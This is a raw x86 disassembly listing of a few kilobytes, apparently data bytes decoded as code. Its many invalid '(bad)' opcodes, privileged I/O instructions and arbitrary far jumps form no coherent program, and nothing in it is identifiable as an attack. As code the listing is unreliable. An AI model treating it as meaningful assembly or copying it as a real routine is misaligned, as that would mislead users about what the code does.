  40dfe7:	pop    ebx
  40dfe8:	sub    BYTE PTR [ecx+ebx*2+0x7daf2ed6],dl
  40dfef:	xchg   edi,eax
  40dff0:	jp     0x40dfcc
  40dff2:	xor    ecx,ebx
  40dff4:	adc    DWORD PTR [esi],ebx
  40dff6:	out    dx,eax
  40dff7:	stc    
  40dff8:	into   
  40dff9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dffa:	addr16 push 0x65
  40dffd:	lar    edi,WORD PTR [edi-0x20720394]
  40e004:	or     dh,bh
  40e006:	jno    0x40e017
  40e008:	add    dh,BYTE PTR [edi+0x7451612c]
  40e00e:	call   0x8650:0x885a2548
  40e015:	(bad)  
  40e016:	stos   DWORD PTR es:[edi],eax
  40e017:	repnz (bad) 
  40e019:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e01a:	adc    dh,BYTE PTR [edi-0x5c]
  40e01d:	sar    bh,1
  40e01f:	cmc    
  40e020:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e021:	fst    QWORD PTR [ebp-0x271f1ec3]
  40e027:	(bad)  
  40e028:	clc    
  40e029:	or     BYTE PTR [edi+ebx*8+0x11],dl
  40e02d:	cli    
  40e02e:	sbb    edi,DWORD PTR [edx-0x396b8acc]
  40e034:	rol    BYTE PTR [ebp-0x75],1
  40e037:	cwde   
  40e038:	add    DWORD PTR cs:[esp+edx*2-0x3],esi
  40e03d:	or     esi,DWORD PTR [eax-0x31]
  40e040:	rcl    BYTE PTR [ecx],0xda
  40e043:	retf   
  40e044:	test   BYTE PTR [ebp-0x60],cl
  40e047:	mov    ebx,0x7236308d
  40e04c:	jns    0x40e07a
  40e04e:	ins    DWORD PTR es:[edi],dx
  40e04f:	jecxz  0x40e028
  40e051:	(bad)  
  40e052:	js     0x40dfe0
  40e054:	scas   al,BYTE PTR es:[edi]
  40e055:	xchg   esp,eax
  40e056:	jne    0x40e072
  40e058:	or     ch,BYTE PTR [ecx+0x2]
  40e05b:	dec    esp
  40e05c:	imul   ebx,DWORD PTR [ebp-0x23],0xffffffa2
  40e060:	inc    esp
  40e061:	pop    edi
  40e062:	dec    edx
  40e063:	inc    ebp
  40e064:	jb     0x40dff5
  40e066:	sahf   
  40e067:	ret    0xd94
  40e06a:	ja     0x40e0ea
  40e06c:	mov    al,BYTE PTR [esi+0x1]
  40e06f:	repz cmp edx,DWORD PTR [edx-0x50ecb50d]
  40e076:	aas    
  40e077:	push   esp
  40e078:	test   edx,0x1b9ff7c5
  40e07e:	xchg   esp,eax
  40e07f:	(bad)  
  40e080:	cmp    al,0xb2
  40e082:	inc    eax
  40e083:	sbb    DWORD PTR [ebp+ebx*8-0x66],0x802f3ca
  40e08b:	les    esp,FWORD PTR [ebp+0x34]
  40e08e:	mov    ds:0x2e1dbf0d,al
  40e093:	mov    eax,ds:0xb63bc63d
  40e098:	add    eax,esi
  40e09a:	(bad)  
  40e09b:	push   cs
  40e09c:	mov    ebp,0x1aabab68
  40e0a1:	sbb    BYTE PTR [edx+0x3a],ch
  40e0a4:	and    DWORD PTR [esi],ebp
  40e0a6:	retf   
  40e0a7:	push   0xaa570f9f
  40e0ac:	xlat   BYTE PTR ds:[ebx]
  40e0ad:	jbe    0x40e0d6
  40e0af:	pop    eax
  40e0b0:	push   edi
  40e0b1:	mov    ds:0x5f7818e1,al
  40e0b6:	cdq    
  40e0b7:	add    BYTE PTR [eax],ah
  40e0b9:	or     BYTE PTR [edx+edi*1-0x62],0x69
  40e0be:	jmp    0xef2b:0x65ff1df5
  40e0c5:	sti    
  40e0c6:	fidiv  DWORD PTR [edi]
  40e0c8:	ror    BYTE PTR ds:[ebx+ebp*8-0x71],1
  40e0cd:	adc    DWORD PTR [edi-0x72],edi
  40e0d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0d1:	pop    ecx
  40e0d2:	daa    
  40e0d3:	pop    edi
  40e0d4:	sbb    edi,esi
  40e0d6:	adc    eax,0x8e72e948
  40e0db:	sahf   
  40e0dc:	inc    esi
  40e0dd:	mov    ch,0x9b
  40e0df:	mov    cl,0xa
  40e0e1:	pop    ss
  40e0e2:	repnz sub dl,BYTE PTR [eax]
  40e0e5:	mov    ebx,0x513387ca
  40e0ea:	ror    DWORD PTR [edx],0xcd
  40e0ed:	xchg   esi,eax
  40e0ee:	call   0x5e4594cb
  40e0f3:	fdiv   QWORD PTR [eax+0xda25642]
  40e0f9:	or     BYTE PTR [ebx-0x5c697072],bh
  40e0ff:	(bad)  
  40e101:	sub    al,0xb3
  40e103:	sbb    eax,0xc09dc39a
  40e108:	inc    eax
  40e109:	xor    edx,DWORD PTR [ebx+eax*2+0x4ea0843c]
  40e110:	cmp    eax,0x61321c58
  40e115:	test   eax,0x1570b094
  40e11a:	mov    ch,0x32
  40e11c:	and    eax,0x2d45f5c1
  40e121:	lods   eax,DWORD PTR ds:[esi]
  40e122:	fistp  DWORD PTR [ebx]
  40e124:	in     al,0x93
  40e126:	ds adc eax,0xfda4dbab
  40e12c:	xchg   esi,eax
  40e12d:	lds    ecx,FWORD PTR [edi+0x15]
  40e130:	pop    ebx
  40e131:	inc    edi
  40e132:	ja     0x40e121
  40e134:	xchg   BYTE PTR [edx],ah
  40e136:	popa   
  40e137:	mov    dh,0x2e
  40e139:	add    DWORD PTR [ecx+0x28f670e6],ecx
  40e13f:	inc    eax
  40e140:	stc    
  40e141:	mov    esp,0xca1a112c
  40e146:	lahf   
  40e147:	sbb    esi,ebp
  40e149:	jle    0x40e1b4
  40e14b:	sbb    BYTE PTR [ebx+eax*1+0x5c3bbfa5],bh
  40e152:	ror    BYTE PTR [edx],1
  40e154:	sbb    ch,bl
  40e156:	sbb    DWORD PTR [edx+0x1bfe9211],ebp
  40e15c:	ins    DWORD PTR es:[edi],dx
  40e15d:	jl     0x40e17f
  40e15f:	retf   0x6e54
  40e162:	mov    WORD PTR [ecx+esi*1],?
  40e165:	adc    eax,0xe7214d87
  40e16a:	xor    eax,DWORD PTR [esi-0x1583f119]
  40e170:	ins    DWORD PTR es:[edi],dx
  40e171:	test   eax,0x160f4f14
  40e176:	mov    BYTE PTR [ebx+edi*8-0x31],ch
  40e17a:	and    al,0x81
  40e17c:	sti    
  40e17d:	ins    BYTE PTR es:[edi],dx
  40e17e:	add    al,BYTE PTR [ebp+0x5d]
  40e181:	in     eax,dx
  40e182:	dec    edx
  40e183:	daa    
  40e184:	sub    BYTE PTR [esi-0x48],cl
  40e187:	and    al,0x9c
  40e189:	xor    DWORD PTR [ebp+0x4c],ebp
  40e18c:	or     BYTE PTR [ecx+0x6e],al
  40e18f:	aaa    
  40e190:	fcmovb st,st(1)
  40e192:	pop    edi
  40e193:	add    BYTE PTR [eax+0x3c],0x66
  40e197:	das    
  40e198:	mov    dl,0x1d
  40e19a:	je     0x40e1c3
  40e19c:	enter  0xdc76,0x5f
  40e1a0:	sbb    esp,esi
  40e1a2:	jo     0x40e1bd
  40e1a4:	arpl   dx,ax
  40e1a6:	test   DWORD PTR [edx+eiz*2],esp
  40e1a9:	fnstenv gs:[esp+ebx*4+0x69]
  40e1ae:	adc    ebp,ecx
  40e1b0:	jp     0x40e16c
  40e1b2:	cmp    al,0x30
  40e1b4:	xor    eax,0x68a15181
  40e1b9:	cmp    esp,DWORD PTR [eax+0x45b4e9eb]
  40e1bf:	int    0xfc
  40e1c1:	pusha  
  40e1c2:	inc    edi
  40e1c3:	fsubr  DWORD PTR [ebp-0x54ce0481]
  40e1c9:	add    esp,DWORD PTR [eax]
  40e1cb:	inc    ebp
  40e1cc:	aad    0x26
  40e1ce:	rol    DWORD PTR [ebp+0x361892c1],1
  40e1d4:	xchg   edi,eax
  40e1d5:	out    dx,eax
  40e1d6:	cwde   
  40e1d7:	ja     0x40e1e1
  40e1d9:	bound  ebp,QWORD PTR [edi]
  40e1db:	inc    edi
  40e1dc:	nop
  40e1dd:	add    BYTE PTR [eax+0x677e8410],ah
  40e1e3:	jl     0x40e20f
  40e1e5:	mov    bl,0xac
  40e1e7:	pop    ds
  40e1e8:	inc    ebx
  40e1e9:	pushf  
  40e1ea:	int    0x49
  40e1ec:	in     eax,dx
  40e1ed:	hlt    
  40e1ee:	inc    eax
  40e1ef:	mov    ecx,0x79f74041
  40e1f4:	je     0x40e181
  40e1f6:	or     al,0x1d
  40e1f8:	mov    dl,0x84
  40e1fa:	pop    ecx
  40e1fb:	scas   eax,DWORD PTR es:[edi]
  40e1fc:	ds mov edi,0x84c66271
  40e202:	sub    DWORD PTR [ecx-0x2d],esi
  40e205:	mov    ecx,DWORD PTR [eax]
  40e207:	jl     0x40e206
  40e209:	inc    eax
  40e20a:	or     eax,0x10e788d6
  40e20f:	icebp  
  40e210:	mov    bh,0xc
  40e212:	repz pop esp
  40e214:	retf   
  40e215:	adc    DWORD PTR [ecx-0x31],0xb6b12dff
  40e21c:	je     0x40e1af
  40e21e:	sub    dl,BYTE PTR [edx+0x391a834d]
  40e224:	js     0x40e282
  40e226:	jg     0x40e201
  40e228:	adc    edi,0x1d256489
  40e22e:	xchg   edx,eax
  40e22f:	cmp    eax,0x7da8e8ed
  40e234:	dec    ebx
  40e235:	arpl   WORD PTR [ebp-0x78],dx
  40e238:	shr    BYTE PTR [eax-0x58],0xba
  40e23c:	mov    esp,0xd9075ded
  40e241:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e242:	or     eax,0x7ca3513b
  40e247:	and    eax,0xc62d918a
  40e24c:	jle    0x40e273
  40e24e:	adc    al,0x8b
  40e250:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e251:	ins    DWORD PTR es:[edi],dx
  40e252:	cmp    eax,0x37bd06e2
  40e257:	xor    ch,0xcb
  40e25a:	loope  0x40e28b
  40e25c:	push   esi
  40e25d:	leave  
  40e25e:	ins    BYTE PTR es:[edi],dx
  40e25f:	cmp    eax,0xba2c3507
  40e264:	pop    esi
  40e265:	cmp    BYTE PTR [esi+0x5cac38df],dh
  40e26b:	xor    eax,0x77480cfe
  40e270:	push   ebp
  40e271:	aam    0x6e
  40e273:	add    BYTE PTR [edi],bh
  40e275:	sar    DWORD PTR es:[eax+0x31d89d13],cl
  40e27c:	sub    BYTE PTR [edi-0x204755df],ch
  40e282:	ficom  WORD PTR [edx]
  40e284:	loope  0x40e256
  40e286:	fsub   QWORD PTR [esi]
  40e288:	sub    al,0x1b
  40e28a:	jne    0x40e28a
  40e28c:	idiv   DWORD PTR [edx-0x72]
  40e28f:	sbb    eax,0xb1e9880c
  40e294:	push   ecx
  40e295:	sbb    ebx,esi
  40e297:	lods   al,BYTE PTR ds:[esi]
  40e298:	repnz out dx,al
  40e29a:	inc    edx
  40e29b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e29c:	lods   eax,DWORD PTR ds:[esi]
  40e29d:	out    0x88,al
  40e29f:	mov    eax,ds:0x4f38c43
  40e2a4:	xchg   edx,eax
  40e2a5:	dec    ecx
  40e2a6:	cmc    
  40e2a7:	in     al,0x6f
  40e2a9:	jecxz  0x40e2ac
  40e2ab:	jl     0x40e23c
  40e2ad:	loope  0x40e2e6
  40e2af:	mov    dl,0x3c
  40e2b1:	outs   dx,BYTE PTR ds:[esi]
  40e2b2:	je     0x40e26e
  40e2b4:	jl     0x40e246
  40e2b6:	push   ds
  40e2b7:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2b9:	push   esi
  40e2ba:	and    BYTE PTR [edi+0x36],ch
  40e2bd:	outs   dx,DWORD PTR ds:[esi]
  40e2be:	popf   
  40e2bf:	addr16 push cs
  40e2c1:	and    BYTE PTR [ebx-0x44],ah
  40e2c4:	sub    edi,DWORD PTR es:[edx]
  40e2c7:	mov    BYTE PTR ds:0x1cf64123,cl
  40e2cd:	inc    ebp
  40e2ce:	adc    al,0x90
  40e2d0:	xchg   ebp,eax
  40e2d1:	retf   0x1994
  40e2d4:	and    edi,DWORD PTR [edx+0x69]
  40e2d7:	and    ch,BYTE PTR [edx-0x5f]
  40e2da:	pusha  
  40e2db:	test   BYTE PTR [ebx],0x9f
  40e2de:	mov    ah,0x57
  40e2e0:	neg    DWORD PTR [esp+eiz*8-0x16]
  40e2e4:	add    eax,0x26e4ad5f
  40e2e9:	push   es
  40e2ea:	mov    dl,0x53
  40e2ec:	popf   
  40e2ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2ee:	jl     0x40e2c6
  40e2f0:	sub    eax,0xd97742b8
  40e2f5:	stc    
  40e2f6:	in     al,0xe7
  40e2f8:	sahf   
  40e2f9:	sbb    ebx,DWORD PTR [eax]
  40e2fb:	fwait
  40e2fc:	mov    edi,0xd26f59b0
  40e301:	xor    DWORD PTR [esi+esi*1+0x6d],esi
  40e305:	lahf   
  40e306:	nop
  40e307:	push   edi
  40e308:	push   edx
  40e309:	mov    gs,WORD PTR [eax]
  40e30b:	jecxz  0x40e378
  40e30d:	lahf   
  40e30e:	fwait
  40e30f:	dec    edx
  40e310:	ret    
  40e311:	cmp    eax,0xdfdab5d1
  40e316:	out    0x1c,eax
  40e318:	(bad)  
  40e319:	and    dh,dl
  40e31b:	(bad)  
  40e31c:	les    ebp,FWORD PTR ds:0x12aacb2c
  40e322:	je     0x40e371
  40e324:	sbb    esp,DWORD PTR [edx-0x7d7465e]
  40e32a:	xor    bl,ch
  40e32c:	jb     0x40e309
  40e32e:	int    0x7c
  40e330:	je     0x40e33c
  40e332:	cmp    BYTE PTR fs:[esi-0x59],ah
  40e336:	inc    edx
  40e337:	call   0xc56c:0x3cfc69d5
  40e33e:	inc    ebp
  40e33f:	and    eax,DWORD PTR [esi+0x7dd80f84]
  40e345:	dec    edx
  40e347:	nop
  40e348:	sub    eax,DWORD PTR [edx+0x40]
  40e34b:	or     DWORD PTR [ecx+eiz*2-0x567ee4c1],ebp
  40e352:	mov    ah,bh
  40e354:	adc    eax,0x8b0b5e13
  40e359:	push   edx
  40e35a:	sub    eax,0xf354cc0b
  40e35f:	lock push ecx
  40e361:	nop
  40e362:	sar    BYTE PTR [esi],1
  40e364:	ins    DWORD PTR es:[edi],dx
  40e365:	cli    
  40e366:	pop    ebx
  40e367:	xchg   ebx,eax
  40e368:	jo     0x40e314
  40e36a:	jecxz  0x40e344
  40e36c:	loopne 0x40e368
  40e36e:	f2xm1  
  40e370:	xor    bh,BYTE PTR [ebx+eiz*4]
  40e373:	shr    BYTE PTR [si+0x79a9],1
  40e378:	cmp    dh,BYTE PTR [edi-0x26141a3f]
  40e37e:	aad    0x71
  40e380:	cdq    
  40e381:	inc    edi
  40e382:	cld    
  40e383:	mul    BYTE PTR [esi+0x73]
  40e386:	jmp    0x40e3e7
  40e388:	(bad)  
  40e389:	cmp    eax,0xec44d4f7
  40e38e:	xor    ebx,esp
  40e390:	or     al,0xaa
  40e392:	inc    esi
  40e393:	pop    ebp
  40e394:	jg     0x40e35d
  40e396:	inc    esp
  40e397:	das    
  40e398:	or     bh,BYTE PTR [ebx-0x3f1fe356]
  40e39e:	cli    
  40e39f:	scas   eax,DWORD PTR es:[edi]
  40e3a0:	jmp    0x895b:0x86b18175
  40e3a7:	imul   ebp,DWORD PTR [esi-0x7b],0xffffffbb
  40e3ab:	imul   eax,DWORD PTR [edx],0x67
  40e3ae:	popf   
  40e3af:	(bad)  
  40e3b0:	stc    
  40e3b1:	not    BYTE PTR [edx+0x77b6bc6a]
  40e3b7:	(bad)  
  40e3b8:	jbe    0x40e3b1
  40e3ba:	pop    ebx
  40e3bb:	adc    DWORD PTR [edx-0x594d5e0],0x1b
  40e3c2:	jg     0x40e3e9
  40e3c4:	mov    WORD PTR [eax],es
  40e3c6:	jecxz  0x40e367
  40e3c8:	shl    BYTE PTR [ebp+0x2d462db1],0x8b
  40e3cf:	sub    dh,0xd2
  40e3d2:	mov    esp,0xd7658d38
  40e3d7:	aaa    
  40e3d8:	inc    edx
  40e3d9:	outs   dx,BYTE PTR ds:[esi]
  40e3da:	shl    DWORD PTR [ecx],0xbf
  40e3dd:	shr    ebp,1
  40e3df:	loope  0x40e3c5
  40e3e1:	mov    ah,0x6d
  40e3e3:	pushf  
  40e3e4:	ins    DWORD PTR es:[edi],dx
  40e3e5:	ror    DWORD PTR [edx+0x5e37568b],0x21
  40e3ec:	pop    ss
  40e3ed:	mov    ah,bl
  40e3ef:	les    esi,FWORD PTR [ebp-0x3b]
  40e3f2:	ss mov eax,0x936bddbf
  40e3f8:	pushf  
  40e3f9:	pop    eax
  40e3fa:	jle    0x40e3b4
  40e3fc:	xor    dh,al
  40e3fe:	fidiv  WORD PTR [eax-0x2e8d9ca9]
  40e404:	daa    
  40e405:	jle    0x40e3d4
  40e407:	dec    ebp
  40e408:	inc    ecx
  40e409:	sbb    bl,bl
  40e40b:	mov    esi,0xb9eb1892
  40e410:	fnstenv [esp+edi*8]
  40e413:	mov    al,ds:0x7cf447d
  40e418:	ss fs xchg edi,eax
  40e41b:	sub    eax,0x7411d5a0
  40e420:	int    0xed
  40e422:	je     0x40e3b5
  40e424:	mov    ds:0x9f6e5c4e,eax
  40e429:	sub    DWORD PTR [ebp-0x3ed8031d],ecx
  40e42f:	xor    BYTE PTR [edx],ah
  40e431:	repz sub BYTE PTR [ebx+0x73dd5a02],ch
  40e438:	outs   dx,BYTE PTR ds:[esi]
  40e439:	adc    eax,0xde475839
  40e43e:	mov    edx,eax
  40e440:	xlat   BYTE PTR ds:[ebx]
  40e441:	xchg   esp,eax
  40e442:	pop    eax
  40e443:	das    
  40e444:	xchg   esi,eax
  40e445:	repz and edx,DWORD PTR [eax+0x51]
  40e449:	into   
  40e44a:	in     al,0x9b
  40e44c:	lea    eax,[edx+0x1122c0da]
  40e452:	jle    0x40e3f9
  40e454:	data16 sub BYTE PTR [esi-0x43b11421],0xf6
  40e45c:	xchg   DWORD PTR [ebp-0x38],edi
  40e45f:	push   edi
  40e460:	add    esi,esi
  40e462:	mov    ecx,0x11ef2a1f
  40e467:	dec    ebx
  40e468:	cmp    eax,0x96d63bd8
  40e46d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e46e:	enter  0x5c34,0x55
  40e472:	out    0x2b,eax
  40e474:	adc    al,BYTE PTR [ebx-0x10]
  40e477:	or     BYTE PTR ds:0xa1db11c0,0xd8
  40e47e:	jl     0x40e4cd
  40e480:	inc    edx
  40e481:	(bad)  
  40e482:	push   ss
  40e483:	lock iret 
  40e485:	jnp    0x40e487
  40e487:	sahf   
  40e488:	xor    al,0x60
  40e48a:	lods   eax,DWORD PTR ds:[esi]
  40e48b:	xor    ch,BYTE PTR [ebx+esi*2]
  40e48e:	fbstp  TBYTE PTR [edx-0x40a21fd8]
  40e494:	bound  edi,QWORD PTR [edx-0x3f]
  40e497:	cs call 0xfca8:0xf86708e7
  40e49f:	iret   
  40e4a0:	xor    eax,0x4bdab76f
  40e4a5:	pop    ecx
  40e4a6:	jle    0x40e4be
  40e4a8:	or     BYTE PTR [eax-0x462e9977],0xa8
  40e4af:	and    eax,0x80b0b2f5
  40e4b4:	dec    ecx
  40e4b5:	inc    edi
  40e4b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4b7:	add    DWORD PTR [edi+0x29],0xb434fd47
  40e4be:	cmp    bl,BYTE PTR [ecx-0x741df8c5]
  40e4c4:	push   edi
  40e4c5:	sub    BYTE PTR [ebx-0x492607cd],bl
  40e4cb:	adc    eax,0x4115baad
  40e4d0:	out    dx,eax
  40e4d1:	in     al,0xd0
  40e4d3:	in     al,0xda
  40e4d5:	ret    
  40e4d6:	push   ecx
  40e4d7:	dec    edi
  40e4d8:	or     ch,BYTE PTR [edi+0x60]
  40e4db:	sub    edx,DWORD PTR [ebp-0x2d]
  40e4de:	xchg   ebx,eax
  40e4df:	jge    0x40e511
  40e4e1:	inc    edx
  40e4e2:	pop    eax
  40e4e3:	lds    edi,FWORD PTR [eax-0x8ecc8a6]
  40e4e9:	in     eax,dx
  40e4ea:	sub    bl,bh
  40e4ec:	gs jmp 0x539c:0x6178d7fe
  40e4f4:	xor    ebp,DWORD PTR [edi]
  40e4f6:	xchg   BYTE PTR [esi],bh
  40e4f8:	xchg   edx,eax
  40e4f9:	out    0xf8,al
  40e4fb:	inc    ebx
  40e4fc:	mov    edx,DWORD PTR [esi+0x51fe20dd]
  40e502:	lods   al,BYTE PTR ds:[esi]
  40e503:	sbb    DWORD PTR [ebp+0x4b],esp
  40e506:	mov    esp,DWORD PTR [ebx+0x1d4af188]
  40e50c:	push   cs
  40e50d:	pop    ss
  40e50e:	in     eax,0x88
  40e510:	and    DWORD PTR [ebp+0x70dd2c67],ecx
  40e516:	shl    BYTE PTR [ebp+0x71],cl
  40e519:	in     eax,dx
  40e51a:	arpl   WORD PTR [eax-0x33],sp
  40e51d:	jb     0x40e4a7
  40e51f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e520:	or     edx,eax
  40e522:	mov    cl,0xf0
  40e524:	(bad)  
  40e525:	cmc    
  40e526:	leave  
  40e527:	pop    esp
  40e528:	pop    esp
  40e529:	mov    ds:0xa28f1db,eax
  40e52e:	jg     0x40e55f
  40e530:	mov    bh,BYTE PTR [esi+0x74fb6940]
  40e536:	sbb    BYTE PTR [ecx],cl
  40e538:	xchg   ecx,eax
  40e539:	sbb    al,0x47
  40e53b:	stos   DWORD PTR es:[edi],eax
  40e53c:	dec    ebp
  40e53d:	and    ebx,DWORD PTR [ecx+0x4e21463]
  40e543:	push   edx
  40e544:	test   ch,bh
  40e546:	pop    ebp
  40e547:	out    0x9,al
  40e549:	xchg   esp,eax
  40e54a:	sbb    ah,BYTE PTR [eax-0x12]
  40e54d:	xor    ecx,edx
  40e54f:	cld    
  40e550:	xor    eax,0xa92f5c0e
  40e555:	test   al,0x4b
  40e557:	push   0x1
  40e559:	adc    eax,0xccafa8de
  40e55e:	(bad)  
  40e55f:	leave  
  40e560:	mov    bh,dh
  40e562:	xchg   esi,eax
  40e563:	push   ebp
  40e565:	call   0xc6035be5
  40e56a:	shr    ecx,cl
  40e56c:	xchg   edx,eax
  40e56d:	push   edi
  40e56e:	xchg   DWORD PTR [eax],ebx
  40e570:	cmp    DWORD PTR [edx+0x39370f8],edi
  40e576:	mov    eax,0xdd030d30
  40e57b:	inc    ebx
  40e57c:	jne    0x40e5f2
  40e57e:	inc    ebp
  40e57f:	xor    DWORD PTR [esi+0x1f2360e1],ebp
  40e585:	pop    edx
  40e586:	imul   edi,DWORD PTR [ebx],0x1f
  40e589:	dec    edx
  40e58a:	sbb    BYTE PTR [ecx],cl
  40e58c:	in     al,dx
  40e58d:	cld    
  40e58e:	rol    DWORD PTR [esi-0x60fbec74],0x6c
  40e595:	add    al,0x14
  40e597:	in     eax,0xb4
  40e599:	add    BYTE PTR [esi-0x1ae50a49],cl
  40e59f:	das    
  40e5a0:	stos   DWORD PTR es:[edi],eax
  40e5a1:	sbb    bl,BYTE PTR [ecx-0x66]
  40e5a4:	shl    edi,1
  40e5a6:	(bad)  
  40e5a7:	call   0xcbd8807d
  40e5ac:	dec    ecx
  40e5ad:	lds    edi,FWORD PTR [ecx+eax*1]
  40e5b0:	jns    0x40e614
  40e5b2:	cwde   
  40e5b3:	addr16 int 0x69
  40e5b6:	push   ebp
  40e5b7:	clc    
  40e5b8:	cld    
  40e5b9:	cmc    
  40e5ba:	rcl    bh,1
  40e5bc:	jge    0x40e621
  40e5be:	xor    BYTE PTR [eax+ebp*4-0x6c23d7b],ch
  40e5c5:	mov    bh,0x31
  40e5c7:	aas    
  40e5c8:	dec    ebx
  40e5c9:	dec    eax
  40e5ca:	arpl   WORD PTR ds:0x7bf46a6a,ax
  40e5d0:	lds    ebp,FWORD PTR [esi-0x5f633578]
  40e5d6:	mov    bh,al
  40e5d8:	fs loop 0x40e5f5
  40e5db:	ds pop eax
  40e5dd:	xlat   BYTE PTR ds:[ebx]
  40e5de:	(bad)
  40e5e1:	jg     0x40e64a
  40e5e3:	cmp    eax,DWORD PTR [esi+0x774869cc]
  40e5e9:	test   eax,0xad27a6fb
  40e5ee:	sub    BYTE PTR [ecx-0x1ce4ac86],bh
  40e5f4:	jmp    0x40e5da
  40e5f6:	add    ebp,DWORD PTR [esi]
  40e5f8:	xchg   ebx,eax
  40e5f9:	mov    edi,0x456474b9
  40e5fe:	fnstsw WORD PTR [ecx-0x42f87e0b]
  40e604:	mov    ebp,0x22242b49
  40e609:	(bad)  
  40e60a:	adc    al,0x52
  40e60c:	popa   
  40e60d:	imul   esp,DWORD PTR cs:[ebp+0xec87dad],0xdbdd8817
  40e618:	(bad)  
  40e619:	fldenv [ecx]
  40e61b:	retf   0x7ab4
  40e61e:	add    edx,DWORD PTR [esi-0x434cba54]
  40e624:	popf   
  40e625:	push   edi
  40e626:	sti    
  40e627:	jo     0x40e5ac
  40e629:	lock mov BYTE PTR [eax],cl
  40e62c:	in     al,0x9a
  40e62e:	push   ecx
  40e62f:	sub    al,0xe
  40e631:	mov    ah,0xfb
  40e633:	push   0x8e189fde
  40e638:	mov    WORD PTR [ecx],es
  40e63a:	lea    eax,[ecx+0x177844b]
  40e640:	pop    eax
  40e641:	test   al,0xf
  40e643:	jg     0x40e691
  40e645:	inc    esp
  40e646:	mov    eax,ds:0xdb5d6653
  40e64b:	xchg   ebp,eax
  40e64c:	push   esp
  40e64d:	xchg   esp,eax
  40e64e:	(bad)  
  40e64f:	cdq    
  40e650:	or     eax,0xf81e23bf
  40e655:	pusha  
  40e656:	or     eax,0x6c5d107f
  40e65b:	ins    DWORD PTR es:[edi],dx
  40e65c:	push   ebx
  40e65d:	fmul   QWORD PTR [ecx+0x6d]
  40e660:	cwde   
  40e661:	dec    eax
  40e662:	pop    edi
  40e663:	inc    esp
  40e664:	xchg   esi,eax
  40e665:	ficom  DWORD PTR [edx+0x8f2c458]
  40e66b:	or     bh,cl
  40e66d:	addr16 dec edx
  40e66f:	cld    
  40e670:	arpl   WORD PTR [edx],sp
  40e672:	mov    fs,WORD PTR [ebp-0x66]
  40e675:	daa    
  40e676:	(bad)  
  40e677:	xor    DWORD PTR [ecx],edi
  40e679:	pop    ebx
  40e67a:	sub    al,0x96
  40e67c:	ss sbb eax,0x4b9c194
  40e682:	fsub   st,st(3)
  40e684:	mov    DWORD PTR [ebx-0x1d929193],eax
  40e68a:	inc    ebx
  40e68b:	inc    edx
  40e68c:	inc    edx
  40e68d:	dec    esp
  40e68e:	lods   eax,DWORD PTR ds:[esi]
  40e68f:	out    0x2f,al
  40e691:	(bad)  
  40e692:	addr16 or al,0xde
  40e695:	mov    dl,0xa2
  40e697:	mov    ds,WORD PTR [edx]
  40e699:	jle    0x40e706
  40e69b:	mov    dl,0xaa
  40e69d:	lock dec esp
  40e69f:	mov    ss,WORD PTR [ebp-0x15]
  40e6a2:	imul   esp,DWORD PTR [esp+ebp*2+0x76],0xdd810f73
  40e6aa:	in     eax,0x57
  40e6ac:	gs jg  0x40e68d
  40e6af:	test   BYTE PTR [ecx+0x29adf532],0xc6
  40e6b6:	adc    ah,al
  40e6b8:	fsubp  st(2),st
  40e6ba:	sbb    edi,edx
  40e6bc:	xchg   ebx,eax
  40e6bd:	dec    edx
  40e6be:	not    BYTE PTR [eax]
  40e6c0:	popa   
  40e6c1:	in     eax,dx
  40e6c2:	mov    BYTE PTR [ebx+0x2d84ef3],dl
  40e6c8:	mov    al,0x1f
  40e6ca:	iret   
  40e6cb:	dec    ebp
  40e6cc:	and    eax,0x498b7d83
  40e6d1:	rcr    DWORD PTR [eax+0x1520b381],cl
  40e6d7:	rol    BYTE PTR [edx+0x68fe12ec],cl
  40e6dd:	mov    ch,BYTE PTR [eax]
  40e6df:	leave  
  40e6e0:	out    0xa6,al
  40e6e2:	(bad)  
  40e6e3:	pop    esp
  40e6e4:	pop    ebp
  40e6e5:	ret    0x7deb
  40e6e8:	push   eax
  40e6e9:	ret    
  40e6ea:	rcr    DWORD PTR ds:0xfacb79a3,0xd8
  40e6f1:	push   ebp
  40e6f2:	pop    edi
  40e6f3:	pop    ds
  40e6f4:	xlat   BYTE PTR ds:[ebx]
  40e6f5:	test   DWORD PTR [ebp-0x7c4d65e4],eax
  40e6fb:	jne    0x40e6ad
  40e6fd:	add    ch,BYTE PTR [edx-0x72c621e4]
  40e703:	rol    DWORD PTR [edi],cl
  40e705:	jb     0x40e6bd
  40e707:	jg     0x40e73a
  40e709:	pop    edx
  40e70a:	loope  0x40e75f
  40e70c:	lods   eax,DWORD PTR ds:[esi]
  40e70d:	push   ebp
  40e70e:	mov    eax,ds:0xe22cdd47
  40e713:	rol    DWORD PTR [ebp+0x59],1
  40e716:	sub    bh,ah
  40e718:	push   eax
  40e719:	jg     0x40e6d6
  40e71b:	add    eax,0x44b41c87
  40e720:	js     0x40e77f
  40e722:	dec    ebx
  40e723:	cmc    
  40e724:	in     eax,dx
  40e725:	aam    0x5
  40e727:	xchg   ebp,eax
  40e728:	xor    al,0x2d
  40e72a:	adc    bl,al
  40e72c:	xchg   edi,eax
  40e72d:	lock fld TBYTE PTR [ebp+0x68d3c87b]
  40e734:	loope  0x40e758
  40e736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e737:	in     eax,dx
  40e738:	ds or  eax,0x216eae77
  40e73e:	mov    al,es:0x9e818bd4
  40e744:	pop    es
  40e745:	mov    ah,BYTE PTR [edi-0x56]
  40e748:	ins    DWORD PTR es:[edi],dx
  40e749:	shl    DWORD PTR cs:[edi],cl
  40e74c:	pop    ss
  40e74d:	test   al,0x2c
  40e74f:	adc    DWORD PTR [ebp-0x4f63eac4],ebp
  40e755:	jg     0x40e6ef
  40e757:	es es add eax,0x56fc4e28
